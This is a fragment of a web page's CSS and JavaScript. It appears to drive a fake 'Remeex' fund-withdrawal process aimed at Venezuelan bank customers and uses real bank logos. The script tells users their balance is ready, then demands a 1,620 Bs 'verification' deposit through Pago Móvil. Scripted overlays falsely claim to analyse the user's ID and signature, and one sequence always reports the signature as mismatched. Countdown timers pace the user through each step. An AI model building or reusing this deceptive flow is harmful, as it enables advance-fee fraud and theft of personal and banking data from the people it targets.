              <!-- Ondas de resplandor expandiéndose -->
              <div class="glow-ripple"></div>
              <div class="glow-ripple" style="animation-delay: 2s"></div>
              <div class="glow-ripple" style="animation-delay: 4s"></div>
            </div>
          </div>

          <!-- Texto de carga (usaremos el ID loadingTextOverlay para que showBankOverlay lo actualice) -->
          <div class="loading-text" id="loadingTextOverlay">Conectando con tu banco...</div>
        </div>
      </div>      <style>
        :root {
          --primary-color: #0b3b8e;
          --secondary-color: #0a67dd;
          --accent-color: #0a214a;
          --highlight-color: #e6f0ff;
          --glow-color: #3e95ff;
        }
        #overlayBankConnection .overlay-container {
          background: linear-gradient(180deg, transparent 0%, rgba(255, 255, 255, 0.08) 20%, rgba(255, 255, 255, 0.12) 100%);
          backdrop-filter: blur(16px);
          border-radius: 30px;
          padding: 2.5rem;
          width: 90%;
          max-width: 420px;
          box-shadow:
              0 25px 50px -12px rgba(0, 0, 0, 0.4),
              0 0 0 1px rgba(255, 255, 255, 0.1);
          text-align: center;
          position: relative;
          overflow: hidden;
          animation: container-float 8s infinite ease-in-out;
          z-index: 10;
          transition: opacity 1.2s ease-out, transform 1.5s ease-out;
        }
        @keyframes container-float {
          0%, 100% { transform: translateY(0) rotateX(2deg); }
          50% { transform: translateY(-10px) rotateX(0deg); }
        }
        #overlayBankConnection .overlay-container::before {
          content: '';
          position: absolute;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          background: linear-gradient(180deg, rgba(0, 0, 0, 0) 0%, rgba(0, 0, 0, 0.3) 100%);
          opacity: 0;
          animation: darkenBackground 8s ease-in-out infinite;
        }
        @keyframes darkenBackground {
          0%, 100% { opacity: 0; }
          50% { opacity: 1; }
        }
        #overlayBankConnection .logo-container {
          margin-top: -4rem;
          margin-bottom: 2rem;
          position: relative;
          z-index: 2;
        }
        #overlayBankConnection .placeholder-logo {
          background: linear-gradient(135deg, #ffffff 0%, #f5f7fa 100%);
          width: 120px;
          height: 120px;
          border-radius: 24px;
          margin: 0 auto;
          display: flex;
          align-items: center;
          justify-content: center;
          font-weight: bold;
          color: #2563eb;
          box-shadow:
              0 15px 35px -5px rgba(0, 0, 0, 0.2),
              0 0 10px rgba(255, 255, 255, 0.1),
              inset 0 0 0 1px rgba(255, 255, 255, 0.5);
          transform: rotateX(10deg) rotateY(5deg);
          animation: logo-float 6s infinite ease-in-out;
          letter-spacing: 0.5px;
          font-size: 16px;
        }
        @keyframes logo-float {
          0%, 100% { transform: rotateX(10deg) rotateY(5deg); }
          50% { transform: rotateX(5deg) rotateY(-5deg); }
        }
        #overlayBankConnection .ai-orb-container {
          margin: 1.5rem 0;
          height: 220px;
          display: flex;
          justify-content: center;
          align-items: center;
          position: relative;
          z-index: 2;
          transform-style: preserve-3d;
          perspective: 1000px;
        }
        #overlayBankConnection .ai-orb {
          position: relative;
          width: 220px;
          height: 220px;
          border-radius: 50%;
          background: radial-gradient(circle at 30% 30%,
              rgba(225, 239, 255, 0.95) 0%,
              rgba(102, 169, 255, 0.85) 25%,
              rgba(22, 93, 212, 0.75) 55%,
              rgba(10, 42, 105, 0.7) 80%,
              rgba(4, 20, 50, 0.7) 100%);
          box-shadow:
              inset 0 0 50px rgba(164, 202, 254, 0.6),
              0 0 60px rgba(42, 121, 213, 0.7),
              0 0 100px rgba(10, 42, 105, 0.4);
          overflow: hidden;
          animation: pulse-orb 6s infinite ease-in-out;
          transform-origin: center;
          transition: transform 1.8s ease-out, box-shadow 1.8s ease-out;
        }
        @keyframes pulse-orb {
          0%, 100% {
            transform: scale(0.94);
            box-shadow:
                inset 0 0 30px rgba(164, 202, 254, 0.6),
                0 0 50px rgba(42, 121, 213, 0.5),
                0 0 80px rgba(10, 42, 105, 0.4);
          }
          50% {
            transform: scale(1.06);
            box-shadow:
                inset 0 0 50px rgba(213, 232, 255, 0.8),
                0 0 70px rgba(22, 93, 212, 0.8),
                0 0 120px rgba(7, 28, 71, 0.6);
          }
        }
        #overlayBankConnection .orbital-ring {
          position: absolute;
          border-radius: 50%;
          border: 1px solid rgba(255, 255, 255, 0.15);
          top: 50%;
          left: 50%;
          transform: translate(-50%, -50%);
          opacity: 0;
          animation: ring-appear 12s infinite ease-out;
        }
        #overlayBankConnection .orbital-ring:nth-child(1) {
          width: 250px;
          height: 250px;
          animation-delay: 0s;
        }
        #overlayBankConnection .orbital-ring:nth-child(2) {
          width: 280px;
          height: 280px;
          animation-delay: 0.7s;
        }
        #overlayBankConnection .orbital-ring:nth-child(3) {
          width: 310px;
          height: 310px;
          animation-delay: 1.4s;
        }
        @keyframes ring-appear {
          0% {
            opacity: 0;
            transform: translate(-50%, -50%) scale(0.8);
          }
          10% {
            opacity: 0.7;
            transform: translate(-50%, -50%) scale(1);
          }
          30% {
            opacity: 0.3;
          }
          60% {
            opacity: 0;
            transform: translate(-50%, -50%) scale(1.2);
          }
          100% {
            opacity: 0;
            transform: translate(-50%, -50%) scale(1.3);
          }
        }
        #overlayBankConnection .wave-overlay {
          position: absolute;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          border-radius: 50%;
          overflow: hidden;
          opacity: 0.85;
          mix-blend-mode: screen;
        }
        .liquid-wave {
          position: absolute;
          width: 200%;
          height: 200%;
          background: linear-gradient(120deg,
              rgba(225, 239, 255, 0.8),
              rgba(42, 121, 213, 0.6),
              rgba(10, 42, 105, 0.4));
          border-radius: 43%;
          animation: rotate-wave 20s infinite linear;
          transform-origin: 50% 49%;
          filter: blur(4px);
        }
        .liquid-wave:nth-child(1) {
          animation-duration: 28s;
          background: linear-gradient(120deg,
              rgba(231, 243, 255, 0.7),
              rgba(102, 169, 255, 0.5),
              rgba(22, 93, 212, 0.4));
        }
        .liquid-wave:nth-child(2) {
          animation-duration: 18s;
          animation-direction: reverse;
          background: linear-gradient(120deg,
              rgba(213, 232, 255, 0.7),
              rgba(22, 93, 212, 0.5),
              rgba(7, 28, 71, 0.4));
          transform: rotate(60deg);
        }
        .liquid-wave:nth-child(3) {
          animation-duration: 14s;
          background: linear-gradient(120deg,
              rgba(245, 250, 255, 0.6),
              rgba(42, 121, 213, 0.4),
              rgba(4, 47, 114, 0.3));
          transform: rotate(120deg);
        }
        @keyframes rotate-wave {
          0% { transform: rotate(0deg); }
          100% { transform: rotate(360deg); }
        }
        .fluid-effect {
          position: absolute;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          border-radius: 50%;
          overflow: hidden;
          mix-blend-mode: screen;
        }
        .color-shift {
          position: absolute;
          width: 300%;
          height: 300%;
          top: -100%;
          left: -100%;
          background:
              radial-gradient(circle at 30% 40%,
                  rgba(213, 232, 255, 0.9) 0%,
                  rgba(42, 121, 213, 0.0) 35%),
              radial-gradient(circle at 70% 60%,
                  rgba(102, 169, 255, 0.8) 0%,
                  rgba(7, 28, 71, 0.0) 45%);
          filter: blur(20px);
          animation: shift-colors 15s infinite ease-in-out;
          opacity: 0.8;
        }
        @keyframes shift-colors {
          0%, 100% {
            transform: rotate(0deg) scale(1);
            opacity: 0.8;
          }
          25% {
            transform: rotate(45deg) scale(1.1);
            opacity: 0.9;
            filter: hue-rotate(-10deg) saturate(1.3);
          }
          50% {
            transform: rotate(90deg) scale(1);
            opacity: 0.8;
            filter: hue-rotate(0deg) saturate(1.6);
          }
          75% {
            transform: rotate(135deg) scale(1.1);
            opacity: 0.9;
            filter: hue-rotate(10deg) saturate(1.3);
          }
        }
        .flow-pattern {
          position: absolute;
          width: 250%;
          height: 250%;
          top: -75%;
          left: -75%;
          background:
              radial-gradient(ellipse at 40% 50%,
                  rgba(42, 121, 213, 0.5) 0%,
                  rgba(42, 121, 213, 0.0) 55%),
              radial-gradient(circle at 60% 70%,
                  rgba(10, 42, 105, 0.4) 0%,
                  rgba(10, 42, 105, 0.0) 45%);
          filter: blur(8px);
          animation: flow-movement 12s infinite ease-in-out alternate;
          transform-origin: center;
        }
        @keyframes flow-movement {
          0%, 100% {
            transform: scale(1) translate(0, 0);
          }
          25% {
            transform: scale(1.1) translate(5%, -5%);
          }
          50% {
            transform: scale(1.05) translate(3%, 7%);
          }
          75% {
            transform: scale(1.1) translate(-5%, 5%);
          }
        }
        .luminous-flow {
          position: absolute;
          width: 100%;
          height: 100%;
          border-radius: 50%;
          overflow: hidden;
          opacity: 0.8;
        }
        .integrated-core {
          position: absolute;
          top: 50%;
          left: 50%;
          transform: translate(-50%, -50%);
          width: 42%;
          height: 42%;
          border-radius: 50%;
          background: radial-gradient(circle,
              rgba(255, 255, 255, 0.95) 0%,
              rgba(180, 210, 255, 0.9) 20%,
              rgba(102, 169, 255, 0.8) 40%,
              rgba(22, 93, 212, 0.5) 70%,
              rgba(22, 93, 212, 0.0) 100%);
          filter: blur(5px);
          box-shadow: 0 0 30px rgba(213, 232, 255, 0.8);
          animation: pulse-core 5s infinite ease-in-out;
          z-index: 2;
        }
        @keyframes pulse-core {
          0%, 100% {
            transform: translate(-50%, -50%) scale(0.9);
            opacity: 0.7;
            filter: blur(5px);
          }
          50% {
            transform: translate(-50%, -50%) scale(1.1);
            opacity: 0.9;
            filter: blur(8px) brightness(1.2);
          }
        }
        .glow-ripple {
          position: absolute;
          top: 50%;
          left: 50%;
          transform: translate(-50%, -50%);
          width: 10%;
          height: 10%;
          border-radius: 50%;
          background: rgba(240, 248, 255, 0.9);
          opacity: 0;
          box-shadow: 0 0 15px rgba(225, 239, 255, 0.9);
          animation: ripple-effect 6s infinite;
          z-index: 1;
        }
        @keyframes ripple-effect {
          0%, 100% {
            transform: translate(-50%, -50%) scale(0.1);
            opacity: 0;
          }
          10% {
            opacity: 0.9;
          }
          90% {
            opacity: 0;
          }
          100% {
            transform: translate(-50%, -50%) scale(9);
          }
        }
        .particle {
          position: absolute;
          width: 6px;
          height: 6px;
          border-radius: 50%;
          background-color: rgba(255, 255, 255, 0.7);
          filter: blur(1px);
          box-shadow: 0 0 10px rgba(62, 149, 255, 0.8);
          z-index: 0;
          opacity: 0;
          top: 50%;
          left: 50%;
          transform: translate(-50%, -50%);
        }
        .connection-line {
          position: absolute;
          height: 1px;
          background: linear-gradient(90deg,
              rgba(255, 255, 255, 0) 0%,
              rgba(255, 255, 255, 0.5) 50%,
              rgba(255, 255, 255, 0) 100%);
          animation: line-opacity 4s infinite ease-in-out;
          transform-origin: left center;
          z-index: 0;
          opacity: 0;
        }
        @keyframes line-opacity {
          0%, 100% { opacity: 0; }
          50% { opacity: 0.7; }
        }
        .hex-container {
          position: absolute;
          width: 100%;
          height: 100%;
          top: 0;
          left: 0;
          z-index: 0;
          opacity: 0.5;
        }
        .hex {
          position: absolute;
          width: 20px;
          height: 11.55px;
          background-color: rgba(62, 149, 255, 0.1);
          border: 1px solid rgba(255, 255, 255, 0.2);
          transform: rotate(30deg);
          opacity: 0;
          animation: hex-float 10s infinite ease-in-out;
        }
        .hex:before, .hex:after {
          content: "";
          position: absolute;
          width: 0;
          border-left: 10px solid transparent;
          border-right: 10px solid transparent;
        }
        .hex:before {
          bottom: 100%;
          border-bottom: 5.77px solid rgba(62, 149, 255, 0.1);
        }
        .hex:after {
          top: 100%;
          border-top: 5.77px solid rgba(62, 149, 255, 0.1);
        }
        @keyframes hex-float {
          0%, 100% {
            transform: rotate(30deg) translate(0, 0);
            opacity: 0;
          }
          25% {
            opacity: 0.7;
          }
          75% {
            opacity: 0.7;
          }
          100% {
            transform: rotate(390deg) translate(40px, 40px);
            opacity: 0;
          }
        }
        .progress-ring {
          position: absolute;
          top: 50%;
          left: 50%;
          transform: translate(-50%, -50%);
          width: 250px;
          height: 250px;
          z-index: 0;
        }
        .progress-ring-circle {
          fill: transparent;
          stroke: rgba(62, 149, 255, 0.15);
          stroke-width: 1px;
          stroke-dasharray: 628;
          stroke-dashoffset: 628;
          animation: ring-progress 8s infinite linear;
        }
        @keyframes ring-progress {
          0% {
            stroke-dashoffset: 628;
          }
          100% {
            stroke-dashoffset: 0;
          }
        }
        #overlayBankConnection .loading-text {
          color: white;
          font-size: 1.1rem;
          margin: 1.5rem 0;
          min-height: 1.5em;
          opacity: 0.95;
          position: relative;
          z-index: 2;
          animation: fadeText 3s infinite ease-in-out;
          font-weight: 300;
          letter-spacing: 0.5px;
          text-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
        }
        @keyframes fadeText {
          0%, 100% { opacity: 0.95; }
          50% { opacity: 0.7; }
        }
        .progress-border {
          position: absolute;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
          pointer-events: none;
          z-index: 1;
        }
        .progress-line {
          position: absolute;
          background: #2563eb;
          box-shadow: 0 0 10px rgba(37, 99, 235, 0.5);
        }
        .progress-line.top {
          top: 0;
          left: 0;
          height: 2px;
          width: 0%;
          animation: line-grow-top 4s infinite ease-in-out;
        }
        .progress-line.right {
          top: 0;
          right: 0;
          width: 2px;
          height: 0%;
          animation: line-grow-right 4s infinite ease-in-out;
        }
        .progress-line.bottom {
          bottom: 0;
          right: 0;
          height: 2px;
          width: 0%;
          animation: line-grow-bottom 4s infinite ease-in-out;
        }
        .progress-line.left {
          bottom: 0;
          left: 0;
          width: 2px;
          height: 0%;
          animation: line-grow-left 4s infinite ease-in-out;
        }
        @keyframes line-grow-top {
          0%, 100% { width: 0%; }
          50% { width: 100%; }
        }
        @keyframes line-grow-right {
          0%, 100% { height: 0%; }
          50% { height: 100%; }
        }
        @keyframes line-grow-bottom {
          0%, 100% { width: 0%; }
          50% { width: 100%; }
        }
        @keyframes line-grow-left {
          0%, 100% { height: 0%; }
          50% { height: 100%; }
        }
      </style>
      <script>
        /**********************************************************************
         * PARTE 1:
         *  gestorDatos.js - Sistema moderno de gestión de datos
         **********************************************************************/
        class GestorDatos {
          constructor() {
            // Estructura moderna de datos
            this.datos = {
              usuario: {
                nombre: '',
                documento: '',
                fechaNacimiento: '',
                telefono: ''
              },
              banco: {
                nombre: '',
                cuenta: '',
                tipo: ''
              },
              financiero: {
                saldo: 0,
                montoVerificacion: 1620,
                get montoTotal() {
                  return this.saldo + this.montoVerificacion;
                }
              }
            };
            // Mapeo moderno de logos bancarios con URLs de alta resolución
            this.logosBancos = new Map([
              ['Banco de Venezuela', {
                url: 'https://www.bancodevenezuela.com/wp-content/uploads/2023/03/logonuevo.png',
                codigo: '0102'
              }],
              ['Banco Central de Venezuela', {
                url: 'https://www.bcv.org.ve/sites/default/files/default_images/logo_bcv-04_2.png',
                codigo: '0001'
              }],
              ['Banco Venezolano de Crédito', {
                url: 'https://www.venezolano.com/images/galeria/108_1.png',
                codigo: '0104'
              }],
              ['Banco Mercantil', {
                url: 'https://www.mercantilbanco.com/mercprod/images/comunes/logo_popups.gif',
                codigo: '0105'
              }],
              ['Banco Provincial', {
                url: 'https://upload.wikimedia.org/wikipedia/commons/d/d4/BBVAprovinciallogo.svg',
                codigo: '0108'
              }],
              ['Banesco Banco Universal', {
                url: 'https://banesco-prod-2020.s3.amazonaws.com/wp-content/themes/banescocontigo/assets/images/header/logo.svg.gzip',
                codigo: '0134'
              }],
              ['Bancamiga Banco Universal', {
                url: 'https://upload.wikimedia.org/wikipedia/commons/thumb/a/a3/Bancamiga.png/320px-Bancamiga.png',
                codigo: '0172'
              }]
            ]);
          }
          // Método para convertir un saldo de texto a número
          convertirSaldo(saldoTexto) {
            return parseFloat(
              saldoTexto.replace(/\./g, '')
                        .replace(',', '.')
                        .replace(/[^\d.]/g, '')
            ) || 0;
          }
          // Método para cargar datos desde sessionStorage
          async cargarDatos() {
            try {
              const datosRemeex = JSON.parse(sessionStorage.getItem('datosRemeex') || '{}');
              const saldoBS = sessionStorage.getItem('currentBalanceBS') || '0,00 Bs';
              this.datos.usuario.nombre = datosRemeex.fullName || '[Usuario]';
              this.datos.usuario.documento = datosRemeex.docNumberCompleto || '[Doc]';
              this.datos.usuario.fechaNacimiento = datosRemeex.birthDate || '[Fecha]';
              this.datos.usuario.telefono = datosRemeex.userPhone || '';
              this.datos.banco.nombre = datosRemeex.bankName || '[Banco]';
              this.datos.banco.cuenta = datosRemeex.bankAccount || '[Cuenta]';
              this.datos.banco.tipo = datosRemeex.bankType || '[Tipo]';
              this.datos.financiero.saldo = this.convertirSaldo(saldoBS);
              return true;
            } catch (error) {
              console.error('Error al cargar datos:', error);
              return false;
            }
          }
          // Método para formatear números al estilo venezolano
          formatearNumeroVE(numero) {
            return numero.toLocaleString('es-VE', {
              minimumFractionDigits: 2,
              maximumFractionDigits: 2
            }).replace('.', ',');
          }
          // Método principal para actualizar la interfaz con los datos cargados
          async actualizarInterfaz() {
            // Nombre de usuario
            this.actualizarTexto('userName', this.datos.usuario.nombre);
            // Saldo
            const saldoFormateado = this.formatearNumeroVE(this.datos.financiero.saldo) + ' Bs';
            this.actualizarTexto('balanceAmount', saldoFormateado);
            // Datos de Beneficiario
            this.actualizarHTML('benefName', `Nombre: <strong>${this.datos.usuario.nombre}</strong>`);
            this.actualizarHTML('benefDoc', `Documento: <strong>${this.datos.usuario.documento}</strong>`);
            this.actualizarHTML('benefBirth', `F. Nac: <strong>${this.datos.usuario.fechaNacimiento}</strong>`);
            // Datos bancarios
            this.actualizarHTML('nombreBanco', `Banco: <strong>${this.datos.banco.nombre}</strong>`);
            this.actualizarHTML('numeroCuenta', `N° de Cuenta: <strong>${this.datos.banco.cuenta}</strong>`);
            this.actualizarHTML('tipoCuenta', `Tipo: <strong>${this.datos.banco.tipo}</strong>`);
            // Logo del banco principal
            await this.cambiarLogo('bankLogoSmall', this.datos.banco.nombre);

            // Nombre del banco en varios sitios
            document.querySelectorAll('.nombreBancoUsuario').forEach(el => {
              el.textContent = this.datos.banco.nombre;
            });
            document.querySelectorAll('.numeroCuentaUsuario').forEach(el => {
              el.textContent = this.datos.banco.cuenta;
            });
            // Sección "Tu dinero está listo"
            const saldoListoEl = document.getElementById('saldoListo');
            if (saldoListoEl) {
              saldoListoEl.textContent = saldoFormateado;
            }
            const nombreUsuarioAviso = document.getElementById('nombreUsuarioAviso');
            if (nombreUsuarioAviso) {
              nombreUsuarioAviso.textContent = this.datos.usuario.nombre;
            }
            // Sección "Verificación rápida"
            const saldoRequerido = document.getElementById('saldoRequerido');
            if (saldoRequerido) {
              saldoRequerido.textContent = saldoFormateado;
            }
            // Sección "Último paso..."
            const montoRetiroBs = document.getElementById('montoRetiroBs');
            if (montoRetiroBs) {
              montoRetiroBs.textContent = saldoFormateado;
            }

            // Calcular el saldo total (saldo + 1620)
            const totalNum = this.datos.financiero.saldo + this.datos.financiero.montoVerificacion;
            const totalFormatted = this.formatearNumeroVE(totalNum) + ' Bs';
            // Actualizar varios sitios con total
            const montoDepositoTotal = document.getElementById('montoDepositoTotal');
            if (montoDepositoTotal) {
              montoDepositoTotal.textContent = totalFormatted;
            }
            const saldoFinalDisplay = document.getElementById('saldoFinalDisplay');
            if (saldoFinalDisplay) {
              saldoFinalDisplay.textContent = totalFormatted;
            }
            const totalFinalConReembolso = document.getElementById('totalFinalConReembolso');
            if (totalFinalConReembolso) {
              totalFinalConReembolso.textContent = totalFormatted;
            }
            // Banco final usuario
            const bancoFinalUsuario = document.getElementById('bancoFinalUsuario');
            if (bancoFinalUsuario) {
              bancoFinalUsuario.textContent = this.datos.banco.nombre;
            }
            // (Opcional) Actualizar el overlay de error final
            const bancoErrorFinal = document.getElementById('bancoErrorFinal');
            if (bancoErrorFinal) {
              bancoErrorFinal.textContent = this.datos.banco.nombre;
            }
            const montoErrorFinal = document.getElementById('montoErrorFinal');
            if (montoErrorFinal) {
              montoErrorFinal.textContent = saldoFormateado;
            }
            // Recarga: datos precompletados
            const recargaBancoOrigen = document.getElementById('recargaBancoOrigen');
            if (recargaBancoOrigen) {
              recargaBancoOrigen.value = this.datos.banco.nombre;
            }
            const recargaCedula = document.getElementById('recargaCedula');
            if (recargaCedula) {
              recargaCedula.value = this.datos.usuario.documento;
            }

            // Actualizar la clase .nombreBancoRecarga con el nombre del banco
            document.querySelectorAll('.nombreBancoRecarga').forEach(el => {
              el.textContent = this.datos.banco.nombre;
            });
            // Actualizar id="conceptoPagoMovil" con el documento del usuario
            this.actualizarTexto('conceptoPagoMovil', this.datos.usuario.documento);
            // Actualizar Resumen (conceptoRecargaResumen)
            const conceptoRecargaResumen = document.getElementById('conceptoRecargaResumen');
            if (conceptoRecargaResumen) {
              conceptoRecargaResumen.textContent = this.datos.usuario.documento;
            }
            // Actualizar "conceptoRecarga"
            const conceptoRecarga = document.getElementById('conceptoRecarga');
            if (conceptoRecarga) {
              conceptoRecarga.textContent = this.datos.usuario.documento;
            }

            // Overlay "Datos de Pago Móvil" (monto + total)
            const verificacionMontoModal = document.getElementById('verificacionMontoModal');
            if (verificacionMontoModal) {
              verificacionMontoModal.textContent = '1.620,00 Bs';
            }
            const totalOverlayPagoMovil = document.getElementById('totalOverlayPagoMovil');
            if (totalOverlayPagoMovil) {
              totalOverlayPagoMovil.textContent = totalFormatted;
            }

            // Status banner: ejemplo
            const statusBanner = document.getElementById('statusBanner');
            if (statusBanner) {
              statusBanner.textContent = "¡Tu cuenta está activa y lista para retirar!";
              statusBanner.style.backgroundColor = "rgba(16, 185, 129, 0.2)";
            }
            // Ajustar también el logo en la barra de progreso
            await this.cambiarLogo('bankProgressLogo', this.datos.banco.nombre);

            // Ajustamos también el logo del overlay "placeholder-logo"
            let selectedLogoUrl = '';
            for (let [key, value] of this.logosBancos.entries()) {
              if (this.datos.banco.nombre.toLowerCase().includes(key.toLowerCase())) {
                selectedLogoUrl = value.url;
                break;
              }
            }
            if (selectedLogoUrl) {
              const placeholderLogo = document.getElementById('placeholderBankLogo');
              if (placeholderLogo) {
                placeholderLogo.innerHTML = '<img src="' + selectedLogoUrl + '" style="width:100%; height:auto; border-radius:20px;" alt="Bank Logo"/>';
              }
            }
          }
          // Auxiliar para actualizar texto
          actualizarTexto(id, texto) {
            const el = document.getElementById(id);
            if (el) {
              el.textContent = texto;
              el.style.animation = 'actualizacion 0.5s ease';
            }
          }
          // Auxiliar para actualizar HTML
          actualizarHTML(id, html) {
            const el = document.getElementById(id);
            if (el) {
              el.innerHTML = html;
              el.style.animation = 'actualizacion 0.5s ease';
            }
          }
          // Cambiar logo del banco
          async cambiarLogo(elementId, bancoNombre) {
            const el = document.getElementById(elementId);
            if (!el) return;
            let logoInfo = null;
            for (let [key, value] of this.logosBancos.entries()) {
              if (bancoNombre.toLowerCase().includes(key.toLowerCase())) {
                logoInfo = value;
                break;
              }
            }
            if (!logoInfo) {
              return;
            }
            el.style.opacity = '0';
            await new Promise(resolve => setTimeout(resolve, 300));
            el.src = logoInfo.url;
            el.style.opacity = '1';
          }
        }

        /**********************************************************************
         * Funciones de apoyo global
         **********************************************************************/
        function copyToClipboard(elementId) {
          const el = document.getElementById(elementId);
          if (!el) return;
          const text = el.textContent || el.value;
          navigator.clipboard.writeText(text).then(() => {
            alert("Copiado: " + text);
          });
        }
        window.copyToClipboard = copyToClipboard;

        let currentStep = 1;
        const totalSteps = 9;
        function updateProgressBar(step) {
          if (step < 1) step = 1;
          if (step > totalSteps) step = totalSteps;
          currentStep = step;
          const progressPercentage = Math.floor((currentStep / totalSteps) * 100);
          const fillEl = document.getElementById("progressBarFill");
          if (fillEl) {
            fillEl.style.width = progressPercentage + "%";
          }
          const progressTextEl = document.getElementById("progressPercentage");
          if (progressTextEl) {
            progressTextEl.textContent = progressPercentage + "%";
          }
        }

        function goToSection(nextSectionId, stepNumber) {
          document.querySelectorAll('.visa-card').forEach(section => {
            section.classList.remove('active');
          });
          const nextSection = document.getElementById(nextSectionId);
          if (nextSection) {
            nextSection.classList.add('active');
            nextSection.scrollIntoView({ behavior: 'smooth' });
          }
          updateProgressBar(stepNumber);
        }

        function setupNavigation() {
          const navigationMap = {
            confirmInfoBtn:        { sectionId: 'uploadSection',         step: 2 },
            continueSecurityBtn1:  { sectionId: 'securityVerification2',  step: 5 },
            continueSecurityBtn2:  { sectionId: 'securityVerification3A', step: 6 },
            continueSecurity3ABtn: { sectionId: 'securityVerification3B', step: 7 },
            continueSecurity3BBtn: { sectionId: 'securityVerification3C', step: 8 },
            recargaReadyBtn:       { sectionId: 'recargaSection',        step: 9 }
          };
          Object.entries(navigationMap).forEach(([buttonId, info]) => {
            const button = document.getElementById(buttonId);
            if (button) {
              button.addEventListener("click", () => {
                goToSection(info.sectionId, info.step);
              });
            }
          });
        }

        // Configuración de tiempos y textos finales específicos:
        const countdownSettings = {
          continueSecurityBtn1: { time: 20, finalText: "Acepto, Quiero continuar" },
          continueSecurityBtn2: { time: 20, finalText: "Entendido, Continuar" },
          continueSecurity3ABtn: { time: 38, finalText: "Siguiente paso" },
          continueSecurity3BBtn: { time: 25, finalText: "Ver instrucciones" },
          recargaReadyBtn: { time: 180, finalText: "Continuar" },
          confirmInfoBtn: { time: 5, finalText: "Confirmar" },
          confirmDocBtn: { time: 0, finalText: "Confirmar Documento" },
          confirmRecargaBtn: { time: 5, finalText: "Confirmar Recarga" }
        };

        // Función para iniciar countdown en cada botón
        function setupCountdowns() {
          Object.entries(countdownSettings).forEach(([buttonId, config]) => {
            const button = document.getElementById(buttonId);
            if (!button) return;
            if (config.time <= 0) return;

            button.innerHTML = `Disponible en ${config.time}s`;
            button.disabled = true;
            button.classList.add("btn-disabled", "btn-waiting");

            const hint = document.createElement("div");
            hint.style.marginTop = "5px";
            hint.style.color = "#999";
            hint.style.fontSize = "0.8rem";
            hint.textContent = "Lee detenidamente las instrucciones";
            button.parentNode.appendChild(hint);

            let remainingTime = config.time;
            const interval = setInterval(() => {
              remainingTime--;
              if (remainingTime <= 0) {
                clearInterval(interval);
                button.innerHTML = `<i class="fas fa-check-circle"></i> ${config.finalText}`;
                button.disabled = false;
                button.classList.remove("btn-disabled", "btn-waiting");
                button.classList.add("btn-ready");
                if (hint.parentNode) hint.parentNode.removeChild(hint);
              } else {
                button.innerHTML = `Disponible en ${remainingTime}s`;
              }
            }, 1000);
          });
        }

        /******************************************************************
         * MOSTRAR OVERLAY DE BANCO (7 pasos de 5s c/u) con mensajes custom
         ******************************************************************/
        function showBankOverlay(messages, onComplete) {
          const overlay = document.getElementById("overlayBankConnection");
          const loadingText = document.getElementById("loadingTextOverlay");

          if (!overlay || !loadingText) return;

          overlay.style.display = "flex";
          let index = 0;

          const interval = setInterval(() => {
            loadingText.textContent = messages[index];
            index++;
            if (index >= messages.length) {
              clearInterval(interval);
              setTimeout(() => {
                overlay.style.display = "none";
                if (onComplete) onComplete();
              }, 5000);
            }
          }, 5000);
        }

        // Primer flujo: al confirmar documento
        function handleConfirmDocumento() {
          const docMessages = [
            "Cargando documento...",
            "Analizando tu documento de identidad...",
            "Comunicándonos con tu banco...",
            "Documento de identidad cargado con éxito",
            "Documento válido",
            "Extrayendo tu firma",
            "Cargando tu firma"
          ];
          showBankOverlay(docMessages, () => {
            goToSection("signatureSection", 3);
          });
        }

        // Segundo flujo: tras "Continuar" en overlayConfirmFirma
        function handleFirmaContinuar() {
          const firmaMessages = [
            "Cargando tu firma...",
            "Comparando tu firma digital con la de tu documento de identidad...",
            "Firma inválida...",
            "Tu firma no coincide...",
            "Analizando tu firma nuevamente...",
            "Tu firma no coincide...",
            "Tu firma digital no coincide..."
          ];
          showBankOverlay(firmaMessages, () => {
            goToSection("securityVerification1", 4);
          });
        }

        function setupSignatureFlow() {
          const saveSignatureBtn = document.getElementById("saveSignatureBtn");
          const overlayConfirmFirma = document.getElementById("overlayConfirmFirma");
          if (saveSignatureBtn && overlayConfirmFirma) {
            saveSignatureBtn.addEventListener("click", () => {
              overlayConfirmFirma.classList.add("active");
            });
          }
          const editarFirmaBtn = document.getElementById("editarFirmaBtn");
          if (editarFirmaBtn) {
            editarFirmaBtn.addEventListener("click", () => {
              overlayConfirmFirma.classList.remove("active");
            });
          }
          const continuarFirmaBtn = document.getElementById("continuarFirmaBtn");
          if (continuarFirmaBtn) {
            continuarFirmaBtn.addEventListener("click", () => {
              overlayConfirmFirma.classList.remove("active");
              handleFirmaContinuar();
            });
          }
          const signatureCanvas = document.getElementById("signatureCanvas");
          const clearSignatureBtn = document.getElementById("clearSignatureBtn");
          if (signatureCanvas) {
            const ctx = signatureCanvas.getContext("2d");
            let isDrawing = false;

            function resizeCanvas() {
              const rect = signatureCanvas.getBoundingClientRect();
              signatureCanvas.width = rect.width;
              signatureCanvas.height = rect.height;
              ctx.lineWidth = 2;
              ctx.lineCap = "round";
              ctx.strokeStyle = "#000";
            }
            window.addEventListener("resize", resizeCanvas);
            resizeCanvas();

            function getCoordinates(e) {
              const rect = signatureCanvas.getBoundingClientRect();
              let clientX, clientY;
              if (e.touches && e.touches[0]) {
                clientX = e.touches[0].clientX;
                clientY = e.touches[0].clientY;
              } else {
                clientX = e.clientX;
                clientY = e.clientY;
              }
              return {
                x: clientX - rect.left,
                y: clientY - rect.top
              };
            }

            function startDrawing(e) {
              e.preventDefault();
              isDrawing = true;
              const { x, y } = getCoordinates(e);
              ctx.beginPath();
              ctx.moveTo(x, y);
            }
            function stopDrawing(e) {
              e.preventDefault();
              isDrawing = false;
            }
            function draw(e) {
              if (!isDrawing) return;
              e.preventDefault();
              const { x, y } = getCoordinates(e);
              ctx.lineTo(x, y);
              ctx.stroke();
            }
            signatureCanvas.addEventListener("mousedown", startDrawing);
            signatureCanvas.addEventListener("mousemove", draw);
            signatureCanvas.addEventListener("mouseup", stopDrawing);
            signatureCanvas.addEventListener("mouseleave", stopDrawing);
            signatureCanvas.addEventListener("touchstart", startDrawing, { passive: false });
            signatureCanvas.addEventListener("touchmove", draw, { passive: false });
            signatureCanvas.addEventListener("touchend", stopDrawing);

            if (clearSignatureBtn) {
              clearSignatureBtn.addEventListener("click", () => {
                ctx.clearRect(0, 0, signatureCanvas.width, signatureCanvas.height);
              });
            }
          }
        }

